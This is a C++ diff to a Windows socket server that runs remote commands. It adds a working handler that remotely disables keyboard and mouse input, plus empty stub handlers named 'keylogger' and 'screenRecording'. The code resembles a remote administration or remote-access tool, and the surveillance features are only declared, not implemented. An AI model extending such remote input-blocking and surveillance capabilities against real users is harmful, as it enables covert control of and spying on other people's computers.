@@ -2,7 +2,8 @@
 
 std::unordered_map<std::string, MessageType> ServerSocket::messageMap;
 
-ServerSocket::ServerSocket() : winAPI() {
+ServerSocket::ServerSocket() : winAPI(), isKeyboardDisabled(false) {
+    
     WSADATA wsaSATA;
     if (WSAStartup(MAKEWORD(2, 2), &wsaSATA) != 0) {
         std::cerr << "WSAStartup failed.\n";
@@ -59,6 +60,9 @@ ServerSocket::ServerSocket() : winAPI() {
         {"listRunningApp", LIST_RUNNING_APP},
         {"listInstalledApp", LIST_INSTALLED_APP},
         {"listFiles", LIST_FILES},
+        {"disableKeyboard", DISABLE_KEYBOARD},
+        {"keylogger", KEY_LOGGER},
+        {"screenRecording", SCREEN_RECORDING}
     };
 }
 
@@ -272,6 +276,35 @@ void ServerSocket::initializeHandlers() {
             return;
         }
     };
+
+    handlers[DISABLE_KEYBOARD] = [this](SOCKET &clientSocket, const std::string& command) {
+        if (isKeyboardDisabled) {
+            // Unblock input
+            winAPI.removeKeyboardHook();
+            sendResponse(clientSocket, "Keyboard and mouse input enabled successfully.");
+            isKeyboardDisabled = false;
+            if (keyboardThread.joinable()) {
+                PostThreadMessage(GetThreadId(keyboardThread.native_handle()), WM_QUIT, 0, 0);
+                keyboardThread.join();
+            }
+        } else {
+            // Block input
+            winAPI.disableKeyboard();
+            // Send a response back to the client indicating success
+            isKeyboardDisabled = true;
+            keyboardThread = std::thread(&ServerSocket::disableKeyboardThread, this);
+            sendResponse(clientSocket, "Keyboard and mouse input disabled successfully.");
+        }
+    };
+
+    handlers[KEY_LOGGER] = [this](SOCKET &clientSocket, const std::string& command) {
+        
+    };
+
+    handlers[SCREEN_RECORDING] = [this](SOCKET &clientSocket, const std::string& command) {
+        
+    };
+
 }
 
 void ServerSocket::handleEvent(SOCKET &clientSocket, const std::string& message) {
